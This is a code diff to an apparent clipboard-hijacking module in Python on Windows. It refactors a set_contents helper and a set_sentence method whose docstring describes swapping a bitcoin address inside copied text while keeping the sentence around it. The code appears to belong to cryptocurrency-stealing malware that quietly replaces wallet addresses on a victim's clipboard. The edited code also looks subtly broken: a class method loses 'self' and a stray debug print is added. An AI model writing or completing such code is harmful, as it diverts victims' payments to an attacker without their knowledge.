@@ -3,6 +3,24 @@ import win32clipboard
 from typing import Union
 from helpers.bitcoin import bitcoin
 
+def set_contents(content: str) -> bool:
+    """Set the contents of the clipboard.
+
+    Args:
+        content (str): The text that will be set in the clipboard.
+
+    Returns:
+        bool: If the content could be set on the users clipboard.
+    """
+    try:
+        win32clipboard.OpenClipboard()
+        win32clipboard.EmptyClipboard()
+        win32clipboard.SetClipboardText(content)
+        win32clipboard.CloseClipboard()
+        return True
+    except:
+        return False
+
 class clipboard: 
     def __init__(self) -> None:
         pass
@@ -25,25 +43,7 @@ class clipboard:
         except:
             return None
         
-    def set_contents(content: str) -> bool:
-        """Set the contents of the clipboard.
-
-        Args:
-            content (str): The text that will be set in the clipboard.
-
-        Returns:
-            bool: If the content could be set on the users clipboard.
-        """
-        try:
-            win32clipboard.OpenClipboard()
-            win32clipboard.EmptyClipboard()
-            win32clipboard.SetClipboardText(content)
-            win32clipboard.CloseClipboard()
-            return True
-        except:
-            return False
-        
-    def set_sentence(self, content: str, switch_address: str) -> bool: 
+    def set_sentence(content: str, switch_address: str) -> bool: 
         """Set a bitcoin address but keep the sentence around it.
 
         Args:
@@ -52,6 +52,7 @@ class clipboard:
         Returns:
             bool: If the content could be set on the users clipboard.
         """
+        print("here")
         sentence = content.split()
         new_sentence: str = ""
         
@@ -61,4 +62,4 @@ class clipboard:
             else:
                 new_sentence += f"{word} "
                 
-        self.set_contents(new_sentence)
+        set_contents(new_sentence)
